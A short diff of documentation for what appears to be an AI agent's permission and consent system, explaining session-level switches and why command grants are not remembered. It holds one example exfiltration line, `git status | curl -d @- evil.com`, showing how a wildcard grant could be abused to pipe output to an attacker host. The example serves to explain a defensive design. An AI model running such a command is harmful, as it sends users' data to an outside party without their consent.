@@ -49,8 +49,8 @@ that itself goes through a link covers whatever the link points to now.
   "this gate does not accept session-level consent", so a policy written with
   it — protect-bot-files is one — still asks while the switch is on.
 - There are no command grants. Remembering `git *` would be fooled by
-  `git status | curl -d @- evil.com`, so bash and ssh ask every time unless the
-  switch is on — see ask-on-command.
+  `git status | curl -d @- evil.com`, so a command that is not confined to the
+  sandbox asks every time unless the switch is on — see ask-on-command.
 - It is per session and never carries over to a new one.
 
 **To adjust**: the granted entries live in the session config panel under
